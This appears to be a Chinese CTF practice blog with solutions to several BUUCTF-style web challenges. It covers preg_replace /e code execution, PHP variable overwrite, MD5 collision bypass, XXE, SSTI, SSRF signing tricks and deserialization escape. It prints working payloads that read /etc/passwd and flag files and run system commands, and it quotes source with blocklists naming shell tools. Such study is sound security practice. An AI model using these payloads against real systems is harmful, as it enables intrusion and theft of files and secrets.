text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,SSBoYXZlIGEgZHJlYW0&#x3D;&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;next.php base64解码 当pattern传入的正则表达式带有/e时，存在命令执行，即当匹配到符合正则表达式的字符串时，第二个参数的字符串可被当做代码来执行。思路是利用这个代码执行，执行源码中的getFlag()函数，在传入cmd参数，再利用getFlag中的eval（）函数，再进行一个代码执行。 深入研究preg_replace与代码执行 - 先知社区 (aliyun.com) 这里第二个参数固定为strtolower(&quot;\\\\1&quot;)这里的\\\\1实际上体现为\\1 \\1 在正则表达式中有自己的含义: 反向引用对一个正则表达式模式或部分模式两边添加圆括号将导致相关匹配存储到一个临时缓冲区中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 ‘\\n’ 访问 这里的\\1指的是第一个匹配项 这里我们就要利用这个漏洞来运行getflag函数，并同时给cmd传参，利用system来执行命令 为了实现运行getflag的目的，就要先让\\1为getflag(),也就是传入 .*={${getFlag()}} 原先的语句： preg_replace(&#39;&#x2F;(&#39; . $regex . &#39;)&#x2F;ei&#39;, &#39;strtolower(&quot;\\\\1&quot;)&#39;, $value); 变成了语句： preg_replace(&#39;&#x2F;(.*)&#x2F;ei&#39;, &#39;strtolower(&quot;\\\\1&quot;)&#39;,&#123;$&#123;getFlag()&#125;&#125;); 这样通过preg_replace后就会运行getflag函数，但是由于php特性.传入后会变为_所以这里要利用正则匹配中的\\S 所以传入的payload为\\S*={${getFlag()}} \\S 在php正则表达式中表示匹配所有非空字符，*表示多次匹配 最终payload为?\\S*={${getFlag()}}&amp;cmd=system(&quot;cat /flag&quot;); [BJDCTF2020]Mark loves cat整吐了知道是git泄露但是用githack扫完之后就是没有源码。。。 接一下百度的wp的源码 index.php &lt;?php include &#39;flag.php&#39;; $yds &#x3D; &quot;dog&quot;; $is &#x3D; &quot;cat&quot;; $handsome &#x3D; &#39;yds&#39;; foreach($_POST as $x &#x3D;&gt; $y)&#123; $$x &#x3D; $y; &#125; foreach($_GET as $x &#x3D;&gt; $y)&#123; $$x &#x3D; $$y; &#125; foreach($_GET as $x &#x3D;&gt; $y)&#123; if($_GET[&#39;flag&#39;] &#x3D;&#x3D;&#x3D; $x &amp;&amp; $x !&#x3D;&#x3D; &#39;flag&#39;)&#123; exit($handsome); &#125; &#125; if(!isset($_GET[&#39;flag&#39;]) &amp;&amp; !isset($_POST[&#39;flag&#39;]))&#123; exit($yds); &#125; if($_POST[&#39;flag&#39;] &#x3D;&#x3D;&#x3D; &#39;flag&#39; || $_GET[&#39;flag&#39;] &#x3D;&#x3D;&#x3D; &#39;flag&#39;)&#123; exit($is); &#125; echo &quot;the flag is: &quot;.$flag; flag.php &lt;?php $flag &#x3D; file_get_contents(&#39;&#x2F;flag&#39;); 前两个foreach语句分别将POST参数和GET参数进行变量覆盖，接着是三个if语句，exit()函数退出脚本的同时输出变量，最后一句是输出我们想要的flag。 首先我们想到的是让脚本执行到最后一句echo $flag;，但即使绕过三个if语句，我们GET传参或者POST传参的flag总会被变量覆盖：如我们GET传参flag=aaa，在第二个foreach语句中变成$flag = $aaa，而$aaa变量没有定义为空，最后的输出就是空 但是由于变量覆盖的原因最终不会显示flag 而exit()函数虽然会退出执行，但也会输出其参数，我们可以利用变量覆盖将exit()函数内的参数用$flag覆盖掉就能输出flag了； 所以我们可以借助后两个if语句中的exit来输出flag 当我们get yds=flag时，满足第二个if判断，而由于第一个foreach语句，$yds=$flag，所以最终就会变成exit($flag); 还可以借助第三个if语句，当我们get flag=flag&amp;is=flag后经过第二个foreach语句$flag=$flag，$is=$flag对flag自身无影响，又因为满足第三个if语句，也会输出flag值 BJDCTF2020]Mark loves cat (两种解法)（变量覆盖漏洞）_Zero_Adam的博客-CSDN博客 BJDCTF2020]Mark loves cat_qtL0ng的博客-CSDN博客 [安洵杯 2019]easy_web进入后看到img参数像base64，解码两次再用16进制转字符串会变成555.png 所以为了想读取源码，我们将index.php按照相同的方式加密后变为 TmprMlpUWTBOalUzT0RKbE56QTJPRGN3 修改后替换img原来的值，发现依旧返回了一大串base64编码，解码后可获得源码 重点： if (preg_match(&quot;&#x2F;ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\\&#39;|\\&quot;|\\&#96;|;|,|\\*|\\?|\\\\|\\\\\\\\|\\n|\\t|\\r|\\xA0|\\&#123;|\\&#125;|\\(|\\)|\\&amp;[^\\d]|@|\\||\\\\$|\\[|\\]|&#123;|&#125;|\\(|\\)|-|&lt;|&gt;&#x2F;i&quot;, $cmd)) &#123; echo(&quot;forbid ~&quot;); echo &quot;&lt;br&gt;&quot;; &#125; else &#123; if ((string)$_POST[&#39;a&#39;] !&#x3D;&#x3D; (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) &#x3D;&#x3D;&#x3D; md5($_POST[&#39;b&#39;])) &#123; echo &#96;$cmd&#96;; &#125; else &#123; echo (&quot;md5 is funny ~&quot;); &#125; &#125; 先看第二个if里的md5的比较，传数组或者传md5值为0e开头的都没法绕过去 (1条消息) 浅谈PHP中哈希比较缺陷问题及哈希强比较相关问题_末初 · mochu7-CSDN博客 MD5碰撞的一些例子 - 简书 (jianshu.com) 从这两篇文章里能找到存在文件十六进制字节流数据的哈希值相等 再考虑到要将一些不可见字符传到服务器，这里可以使用url编码 最终 a&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2 这里要绕过两个if语句，然后执行cmd中的参数，所以可以利用反斜杠绕过，在正则表达式中三个反斜杠才能匹配到反斜杠， (1条消息) 【PHP】之4个反斜杠、3个反斜杠的情况_Hertter的博客-CSDN博客 为什么3反斜杠在php中等于4反斜杠？ - Thinbug 题目里的正则其实有些问题，所以虽然存在了四个反斜杠但是依旧没有过滤掉反斜杠 贴个大佬的文章 从一道CTF的非预期解看PHP反斜杠匹配问题 - 简书 (jianshu.com) 可以先用dir查看目录 ca\\t%20/flag来绕过第一个if 用\\的原因是因为在linux下行尾输\\可以换行并且继续输入命令 这里正则匹配漏了uniq和sort，用这俩也能拿到flag [网鼎杯 2020 朱雀组]phpweb先抓包 发现有两个post的参数 然后根据报错的信息 这里用了call_user_func函数，也就是func是函数名，p是参数 用system试时发现被过滤了，发现file_get_contents函数可以用 file_get_contents拿源码 &lt;?php $disable_fun = array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;, &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;); function gettime($func, $p) &#123; $result = call_user_func($func, $p); $a= gettype($result); if ($a == &quot;string&quot;) &#123; return $result; &#125; else &#123;return &quot;&quot;;&#125; &#125; class Test &#123; var $p = &quot;Y-m-d h:i:s a&quot;; var $func = &quot;date&quot;; function __destruct() &#123; if ($this-&gt;func != &quot;&quot;) &#123; echo gettime($this-&gt;func, $this-&gt;p); &#125; &#125; &#125; $func = $_REQUEST[&quot;func&quot;]; $p = $_REQUEST[&quot;p&quot;]; if ($func != null) &#123; $func = strtolower($func); if (!in_array($func,$disable_fun)) &#123; echo gettime($func, $p); &#125;else &#123; die(&quot;Hacker...&quot;); &#125; &#125; ?&gt; 由于这个过滤不存在与test中，所以可以利用反序列化来执行命令 利用find命令来查找文件名中有flag的文件 最后用file_get_contents来查看文件 [NCTF2019]Fake XML cookbook看到这题目第一眼就感觉是xxe漏洞，正好趁这个机会把xml学一下 从XML相关一步一步到XXE漏洞 - 先知社区 (aliyun.com) NCTF2019]Fake XML cookbook_sgnbi~的博客-CSDN博客 浅谈XML实体注入漏洞 - FreeBuf网络安全行业门户 - XML被设计为传输和存储数据，其焦点是数据的内容。 - HTML被设计用来显示数据，其焦点是数据的外观。 基本语法： - 所有 XML 元素都须有关闭标签。 - XML 标签对大小写敏感。 - XML 必须正确地嵌套。 - XML 文档必须有根元素。 - XML 的属性值须加引号。 - 实体引用，如果你把字符 &quot;&lt;&quot; 放在 XML元素中，会发生错误，这是因为解析器会把它当作新元素的开始。这样会产生XML错误： &lt;bookstore> &lt;!--根元素--> &lt;book category=\"COOKING\"> &lt;!--bookstore的子元素，category为属性--> &lt;title>Everyday Italian&lt;/title> &lt;!--book的子元素，lang为属性--> &lt;author>Giada De Laurentiis&lt;/author> &lt;!--book的子元素--> &lt;year>2005&lt;/year> &lt;!--book的子元素--> &lt;price>30.00&lt;/price> &lt;!--book的子元素--> &lt;/book> &lt;!--book的结束--> &lt;/bookstore> &lt;!--bookstore的结束--> DTD 文档类型定义（DTD）可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。DTD可被成行地声明于XML文档中，也可作为一个外部引用。带有DTD的XML文档实例 &lt;?xml version&#x3D;&quot;1.0&quot;?&gt; &lt;!DOCTYPE note [&lt;!--定义此文档是 note 类型的文档--&gt; &lt;!ELEMENT note (to,from,heading,body)&gt;&lt;!--定义note元素有四个元素--&gt; &lt;!ELEMENT to (#PCDATA)&gt;&lt;!--定义to元素为”#PCDATA”类型--&gt; &lt;!ELEMENT from (#PCDATA)&gt;&lt;!--定义from元素为”#PCDATA”类型--&gt; &lt;!ELEMENT head (#PCDATA)&gt;&lt;!--定义head元素为”#PCDATA”类型--&gt; &lt;!ELEMENT body (#PCDATA)&gt;&lt;!--定义body元素为”#PCDATA”类型--&gt; ]&gt; &lt;note&gt; &lt;to&gt;Y0u&lt;&#x2F;to&gt; &lt;from&gt;@re&lt;&#x2F;from&gt; &lt;head&gt;v3ry&lt;&#x2F;head&gt; &lt;body&gt;g00d!&lt;&#x2F;body&gt; &lt;&#x2F;note&gt; 当使用外部DTD时，通过如下语法引入。 &lt;!DOCTYPE root-element SYSTEM \"filename\"> 外部DTD实例 &lt;?xml version=\"1.0\"?> &lt;!DOCTYPE root-element SYSTEM \"test.dtd\"> &lt;note> &lt;to>Y0u&lt;/to> &lt;from>@re&lt;/from> &lt;head>v3ry&lt;/head> &lt;body>g00d!&lt;/body> &lt;/note> test.dtd： &lt;!ELEMENT to (#PCDATA)>&lt;!--定义to元素为”#PCDATA”类型--> &lt;!ELEMENT from (#PCDATA)>&lt;!--定义from元素为”#PCDATA”类型--> &lt;!ELEMENT head (#PCDATA)>&lt;!--定义head元素为”#PCDATA”类型--> &lt;!ELEMENT body (#PCDATA)>&lt;!--定义body元素为”#PCDATA”类型--> PCDATA的意思是被解析的字符数据。PCDATA是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。文本中的标签会被当作标记来处理，而实体会被展开。 内部实体示例代码 &lt;?xml version &#x3D; &quot;1.0&quot; encoding &#x3D; &quot;utf-8&quot;?&gt; &lt;!DOCTYPE test [ &lt;!ENTITY writer &quot;Dawn&quot;&gt; &lt;!ENTITY copyright &quot;Copyright W3School.com.cn&quot;&gt; ]&gt; &lt;test&gt;&amp;writer;©right;&lt;&#x2F;test&gt; 外部实体示例代码 &lt;?xml version &#x3D; &quot;1.0&quot; encoding &#x3D; &quot;utf-8&quot;?&gt; &lt;!DOCTYPE test [ &lt;!ENTITY file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt; &lt;!ENTITY copyright SYSTEM &quot;http:&#x2F;&#x2F;www.w3school.com.cn&#x2F;dtd&#x2F;entities.dtd&quot;&gt; ]&gt; &lt;author&gt;&amp;file;©right;&lt;&#x2F;author&gt; XXE漏洞简介 XXE漏洞全称XML External Entity Injection 即XML外部实体注入。XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件和代码，造成任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起Dos攻击等危害。XXE漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。 通过各种协议可以实现xxe注入，例如利用file://来访问本地文件系统 解析xml在php库libxml，libxml&gt;=2.9.0的版本中没有XXE漏洞。simplexml_load_string()可以读取XML 简单的payload &lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; &lt;!DOCTYPE a [ &lt;!ENTITY file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt; ]&gt; &lt;xml&gt; &lt;xxe&gt;&amp;file;&lt;&#x2F;xxe&gt; &lt;&#x2F;xml&gt; &lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; &lt;!DOCTYPE note [ &lt;!ENTITY admin SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt; ]&gt; &lt;user&gt;&lt;username&gt;&amp;admin;&lt;&#x2F;username&gt;&lt;password&gt;123456&lt;&#x2F;password&gt;&lt;&#x2F;user&gt; 题解： 抓包，能看出是用xml进行传输数据 直接上payload &lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; &lt;!DOCTYPE note [ &lt;!ENTITY admin SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt; ]&gt; &lt;user&gt;&lt;username&gt;&amp;admin;&lt;&#x2F;username&gt;&lt;password&gt;123456&lt;&#x2F;password&gt;&lt;&#x2F;user&gt; [BSidesCF 2020]Had a bad day看这个url，试试伪协议读取 多了个php 所以可以用这个来读源码?category=php://filter/read=convert.base64-encode/resource=index base64解码后的重点 &lt;?php $file &#x3D; $_GET[&#39;category&#39;]; if(isset($file)) &#123; if( strpos( $file, &quot;woofers&quot; ) !&#x3D;&#x3D; false || strpos( $file, &quot;meowers&quot; ) !&#x3D;&#x3D; false || strpos( $file, &quot;index&quot;))&#123; include ($file . &#39;.php&#39;); &#125; else&#123; echo &quot;Sorry, we currently only support woofers and meowers.&quot;; &#125; &#125; ?&gt; 存在flag.php页面，之后就是想办法把他读出来 接下来有一个 php伪协议嵌套的知识点 PHP伪协议可以将某个文件或文件夹包含在php://filter/convert.base64-encode/resource=flag中。比如：php://filter/convert.base64-encode/index/resource=flag 这样就能绕过if的判断，读取flag文件 [ASIS 2019]Unicorn shop 输入id和价格，应该是购买独角兽，而且price只允许输入一位数，前三个买的时候都显示 但是因为price的输入限制，所以我猜这里应该是要想办法购买第四个独角兽 这里要利用Unicode的编码，查找一个大于1337的字符 https://www.compart.com/en/unicode/ 比如这个 成功拿到flag [BJDCTF2020]Cookie is so stable 看一眼hint flag页面的登录框 这里存在ssti注入 可以试出来是twig模板，根据提示注入点应该在cookie里，抓包 通过修改user内容实现注入 一篇文章带你理解漏洞之 SSTI 漏洞 | K0rz3n&#39;s Blog ssti还是不太懂，毕竟我python还是没学会，遇到ssti的题我只能直接找payload，先放在这，等刷完buu第二页题目之后再回头看一遍 [De1CTF 2019]SSRF Me题目源码 #! &#x2F;usr&#x2F;bin&#x2F;env python # #encoding&#x3D;utf-8 from flask import Flask from flask import request import socket import hashlib import urllib import sys import os import json reload(sys) sys.setdefaultencoding(&#39;latin1&#39;) app &#x3D; Flask(__name__) secert_key &#x3D; os.urandom(16) class Task: def __init__(self, action, param, sign, ip): self.action &#x3D; action self.param &#x3D; param self.sign &#x3D; sign self.sandbox &#x3D; md5(ip) if(not os.path.exists(self.sandbox)): os.mkdir(self.sandbox) def Exec(self): result &#x3D; &#123;&#125; result[&#39;code&#39;] &#x3D; 500 if (self.checkSign()): if &quot;scan&quot; in self.action: tmpfile &#x3D; open(&quot;.&#x2F;%s&#x2F;result.txt&quot; % self.sandbox, &#39;w&#39;) resp &#x3D; scan(self.param) if (resp &#x3D;&#x3D; &quot;Connection Timeout&quot;): result[&#39;data&#39;] &#x3D; resp else: print resp tmpfile.write(resp) tmpfile.close() result[&#39;code&#39;] &#x3D; 200 if &quot;read&quot; in self.action: f &#x3D; open(&quot;.&#x2F;%s&#x2F;result.txt&quot; % self.sandbox, &#39;r&#39;) result[&#39;code&#39;] &#x3D; 200 result[&#39;data&#39;] &#x3D; f.read() if result[&#39;code&#39;] &#x3D;&#x3D; 500: result[&#39;data&#39;] &#x3D; &quot;Action Error&quot; else: result[&#39;code&#39;] &#x3D; 500 result[&#39;msg&#39;] &#x3D; &quot;Sign Error&quot; return result def checkSign(self): if (getSign(self.action, self.param) &#x3D;&#x3D; self.sign): return True else: return False @app.route(&quot;&#x2F;geneSign&quot;, methods&#x3D;[&#39;GET&#39;, &#39;POST&#39;]) def geneSign(): param &#x3D; urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;)) action &#x3D; &quot;scan&quot; return getSign(action, param) @app.route(&#39;&#x2F;De1ta&#39;,methods&#x3D;[&#39;GET&#39;,&#39;POST&#39;]) def challenge(): action &#x3D; urllib.unquote(request.cookies.get(&quot;action&quot;)) param &#x3D; urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;)) sign &#x3D; urllib.unquote(request.cookies.get(&quot;sign&quot;)) ip &#x3D; request.remote_addr if(waf(param)): return &quot;No Hacker!!!!&quot; task &#x3D; Task(action, param, sign, ip) return json.dumps(task.Exec()) @app.route(&#39;&#x2F;&#39;) def index(): return open(&quot;code.txt&quot;,&quot;r&quot;).read() def scan(param): socket.setdefaulttimeout(1) try: return urllib.urlopen(param).read()[:50] except: return &quot;Connection Timeout&quot; def getSign(action, param): return hashlib.md5(secert_key + param + action).hexdigest() def md5(content): return hashlib.md5(content).hexdigest() def waf(param): check&#x3D;param.strip().lower() if check.startswith(&quot;gopher&quot;) or check.startswith(&quot;file&quot;): return True else: return False if __name__ &#x3D;&#x3D; &#39;__main__&#39;: app.debug &#x3D; False app.run(host&#x3D;&#39;0.0.0.0&#39;,port&#x3D;9999) Flask框架，先看路由，geneSign是对传入的param与其他字符串拼接并返回其md5值，De1ta是主要，传入3个参数，以及ip，先判断param是否是gopher或者file开头的参数，不是则过到Task中，并且返回task的Exec()函数结果，另外hint给出提示在flag.txt中有flag 1：&#x2F;geneSign：获得url中parma参数，通过getSign(action, param)生成摘要 2：&#x2F;De1ta：获得cookie中的action和sign，waf(param),创建task对象，调用exce()方法，json格式返回 3：&#x2F;：返回源码 三个函数 def getSign(action, param): return hashlib.md5(secert_key + param + action).hexdigest() def md5(content): return hashlib.md5(content).hexdigest() def waf(param): check&#x3D;param.strip().lower() if check.startswith(&quot;gopher&quot;) or check.startswith(&quot;file&quot;): return True else: return False getSign：返回secert_key + param + action的哈希值md5：waf：禁止了flie和gopher协议 task类 class Task: def __init__(self, action, param, sign, ip): self.action = action self.param = param self.sign = sign self.sandbox = md5(ip) if(not os.path.exists(self.sandbox)): #SandBox For Remote_Addr os.mkdir(self.sandbox) def Exec(self): result = &#123;&#125; result[&#39;code&#39;] = 500 if (self.checkSign()): if &quot;scan&quot; in self.action: tmpfile = open(&quot;./%s/result.txt&quot; % self.sandbox, &#39;w&#39;) resp = scan(self.param) if (resp == &quot;Connection Timeout&quot;): result[&#39;data&#39;] = resp else: print resp tmpfile.write(resp) tmpfile.close() result[&#39;code&#39;] = 200 if &quot;read&quot; in self.action: f = open(&quot;./%s/result.txt&quot; % self.sandbox, &#39;r&#39;) result[&#39;code&#39;] = 200 result[&#39;data&#39;] = f.read() if result[&#39;code&#39;] == 500: result[&#39;data&#39;] = &quot;Action Error&quot; else: result[&#39;code&#39;] = 500 result[&#39;msg&#39;] = &quot;Sign Error&quot; return result def checkSign(self): if (getSign(self.action, self.param) == self.sign): return True else: return False checkSign：检查cookie中的signExec：检查cookie中的action，如果scan在action中，将param的文件内容写入result.txt，如果read在action中，读出result.txt 的内容 hint提示flag在flag.txt 中，想要读到他首先：action=scan，param=flag.txt ，将flag.txt的内容读到result.txt中然后：action=read，将result.txt的内容读出 绕过点：signcheckSign会检查cookie中的sign==getSign（param，action）两个困难点：secert_key的值未知 思路：先进入/De1ta中的challenge函数，在Exec中的scan部分中将flag.txt的内容存入result.txt，然后从read部分中将其存到result字典中读出，再以json形式返回到客户端，我们就能得到flag。 写入与读出部分 而如果action中既有scan,又有read,那么就会依次执行scan和read 而为了绕过这个验证，就要利用 让param = flag.txtread 因为action为scan 所以得到的md5值为keyflag.txtreadscan 满足action=readscan param=flag.txt时的值 解题 ​ 首先进入genesign页面得到md5(keyflag.txtreadscan)的值作为sign 在到de1ta界面抓包get进param=flag.php，在cookie内加入sign和action [安洵杯 2019]easy_serialize_php代码审计 &lt;?php $function &#x3D; @$_GET[&#39;f&#39;]; function filter($img)&#123; $filter_arr &#x3D; array(&#39;php&#39;,&#39;flag&#39;,&#39;php5&#39;,&#39;php4&#39;,&#39;fl1g&#39;); $filter &#x3D; &#39;&#x2F;&#39;.implode(&#39;|&#39;,$filter_arr).&#39;&#x2F;i&#39;; return preg_replace($filter,&#39;&#39;,$img); &#125; if($_SESSION)&#123; unset($_SESSION); &#125; $_SESSION[&quot;user&quot;] &#x3D; &#39;guest&#39;; $_SESSION[&#39;function&#39;] &#x3D; $function; extract($_POST); if(!$function)&#123; echo &#39;&lt;a href&#x3D;&quot;index.php?f&#x3D;highlight_file&quot;&gt;source_code&lt;&#x2F;a&gt;&#39;; &#125; if(!$_GET[&#39;img_path&#39;])&#123; $_SESSION[&#39;img&#39;] &#x3D; base64_encode(&#39;guest_img.png&#39;); &#125;else&#123; $_SESSION[&#39;img&#39;] &#x3D; sha1(base64_encode($_GET[&#39;img_path&#39;])); &#125; $serialize_info &#x3D; filter(serialize($_SESSION)); if($function &#x3D;&#x3D; &#39;highlight_file&#39;)&#123; highlight_file(&#39;index.php&#39;); &#125;else if($function &#x3D;&#x3D; &#39;phpinfo&#39;)&#123; eval(&#39;phpinfo();&#39;); &#x2F;&#x2F;maybe you can find something in here! &#125;else if($function &#x3D;&#x3D; &#39;show_image&#39;)&#123; $userinfo &#x3D; unserialize($serialize_info); echo file_get_contents(base64_decode($userinfo[&#39;img&#39;])); &#125; phpinfo里有东西，可以先看看 接下来我们应该开始想怎么让 base64_decode($userinfo[&#39;img&#39;])的值等于flag的文件名 知识点 反序列化中的对象逃逸 extract()变量覆盖 extract()变量覆盖 但是这里我们不能直接给img赋值，因为img赋值发生在extract之后 反序列化中的对象逃逸 键值逃逸 因为序列化的字符串是严格的，对应的格式不能错，比如s:4:“name”,那s:4就必须有一个字符串长度是4的否则就往后要。 并且反序列化会把多余的字符串当垃圾处理，在花括号内的就是正确的，花括号&#123;&#125;外的就都被扔掉。 接下来是构造payload的部分 首先我们需要构造img属性： s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;; 其中的ZDBnM19mMWFnLnBocA==是d0g3_f1ag.php的base64加密的结果然后在这个属性前面随便加上个序列化字符串（只要是合法的就行），比如： ;s:1:“1”;;s:2:“10”;;s:3:“100”; 所以payload可以为： _SESSION[phpflag]&#x3D;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA&#x3D;&#x3D;&quot;;&#125; session中存在phpflag的原因是由于filter函数会将匹配到的值变为空，而phpflag的长度刚好为7 为7的原因 但是添加了filter函数来进行过滤之后 原来的内容变为了 a:1:&#123;s:7:&quot;&quot;;s:48:&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA&#x3D;&#x3D;&quot;;&#125; 能成功实现读取flag所在文件的命令 post后 对/d0g3_fllllllag进行base64编码后为L2QwZzNfZmxsbGxsbGFn 所以直接把原来的编码替换掉就行 看是看懂了，但我还是想不到这种payload。。。 参考文章 安洵杯 2019]easy_serialize_php -------- 反序列化/序列化和代码审计_若丶时光破灭的博客-CSDN博客 https://www.cnblogs.com/h3zh1/p/12732336.html [CISCN 2019 初赛]Love Math源码 &lt;?php error_reporting(0); &#x2F;&#x2F;听说你很喜欢数学，不知道你是否爱它胜过爱flag if(!isset($_GET[&#39;c&#39;]))&#123; show_source(__FILE__); &#125;else&#123; &#x2F;&#x2F;例子 c&#x3D;20-1 $content &#x3D; $_GET[&#39;c&#39;]; if (strlen($content) &gt;&#x3D; 80) &#123; die(&quot;太长了不会算&quot;); &#125; $blacklist &#x3D; [&#39; &#39;, &#39;\\t&#39;, &#39;\\r&#39;, &#39;\\n&#39;,&#39;\\&#39;&#39;, &#39;&quot;&#39;, &#39;&#96;&#39;, &#39;\\[&#39;, &#39;\\]&#39;]; foreach ($blacklist as $blackitem) &#123; if (preg_match(&#39;&#x2F;&#39; . $blackitem . &#39;&#x2F;m&#39;, $content)) &#123; die(&quot;请不要输入奇奇怪怪的字符&quot;); &#125; &#125; &#x2F;&#x2F;常用数学函数http:&#x2F;&#x2F;www.w3school.com.cn&#x2F;php&#x2F;php_ref_math.asp $whitelist &#x3D; [&#39;abs&#39;, &#39;acos&#39;, &#39;acosh&#39;, &#39;asin&#39;, &#39;asinh&#39;, &#39;atan2&#39;, &#39;atan&#39;, &#39;atanh&#39;, &#39;base_convert&#39;, &#39;bindec&#39;, &#39;ceil&#39;, &#39;cos&#39;, &#39;cosh&#39;, &#39;decbin&#39;, &#39;dechex&#39;, &#39;decoct&#39;, &#39;deg2rad&#39;, &#39;exp&#39;, &#39;expm1&#39;, &#39;floor&#39;, &#39;fmod&#39;, &#39;getrandmax&#39;, &#39;hexdec&#39;, &#39;hypot&#39;, &#39;is_finite&#39;, &#39;is_infinite&#39;, &#39;is_nan&#39;, &#39;lcg_value&#39;, &#39;log10&#39;, &#39;log1p&#39;, &#39;log&#39;, &#39;max&#39;, &#39;min&#39;, &#39;mt_getrandmax&#39;, &#39;mt_rand&#39;, &#39;mt_srand&#39;, &#39;octdec&#39;, &#39;pi&#39;, &#39;pow&#39;, &#39;rad2deg&#39;, &#39;rand&#39;, &#39;round&#39;, &#39;sin&#39;, &#39;sinh&#39;, &#39;sqrt&#39;, &#39;srand&#39;, &#39;tan&#39;, &#39;tanh&#39;]; preg_match_all(&#39;&#x2F;[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*&#x2F;&#39;, $content, $used_funcs); foreach ($used_funcs[0] as $func) &#123; if (!in_array($func, $whitelist)) &#123; die(&quot;请不要输入奇奇怪怪的函数&quot;); &#125; &#125; &#x2F;&#x2F;帮你算出答案 eval(&#39;echo &#39;.$content.&#39;;&#39;); &#125; CISCN 2019 初赛]Love Math - MustaphaMond - 博客园 (cnblogs.com) CISCN 2019 初赛]Love Math_羽的博客-CSDN博客 CISCN 2019 初赛]Love Math_分享简单的安全技术-CSDN博客 [WUSTCTF2020]朴实无华 payload： ？num=1e10&amp;md5=0e215962017&amp;get_flag=more$IFS$9fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag [WesternCTF2018]shrine import flask import os app &#x3D; flask.Flask(__name__) app.config[&#39;FLAG&#39;] &#x3D; os.environ.pop(&#39;FLAG&#39;)&#x2F;&#x2F;注册了一个名为FLAG的config，这里基本可以确定是flag。 @app.route(&#39;&#x2F;&#39;) def index(): return open(__file__).read() @app.route(&#39;&#x2F;shrine&#x2F;&lt;path:shrine&gt;&#39;) def shrine(shrine): def safe_jinja(s): s &#x3D; s.replace(&#39;(&#39;, &#39;&#39;).replace(&#39;)&#39;, &#39;&#39;) blacklist &#x3D; [&#39;config&#39;, &#39;self&#39;]&#x2F;&#x2F;设置黑名单 return &#39;&#39;.join([&#39;&#123;&#123;% set &#123;&#125;&#x3D;None%&#125;&#125;&#39;.format(c) for c in blacklist]) + s&#x2F;&#x2F;把黑名单内的内容置空 return flask.render_template_string(safe_jinja(shrine)) if __name__ &#x3D;&#x3D; &#39;__main__&#39;: app.run(debug&#x3D;True) ssti注入，先试一个49 接下来就可以考虑在shrine下直接即可查看所有app.config内容，但是这题设了黑名单[‘config’,‘self’]并且过滤了括号，但是python还有一个函数叫做url_for，其作用是url是用于构建指定函数的URL，在配合**globals()**，该函数会以字典类型返回当前位置的全部全局变量。这样也可以实现查看的效果 current_app意思应该是当前app，那我们就当前app下的config： 于是可以读到flag &#123;&#123;url_for.__globals__[&#39;current_app&#39;].config&#125;&#125; 也可以用 get_flashed_messages 返回之前在Flask中通过 flash() 传入的闪现信息列表。把字符串对象表示的消息加入到一个消息队列中，然后通过调用 get_flashed_messages() 方法取出(闪现信息只能取出一次，取出后闪现信息会被清空)。 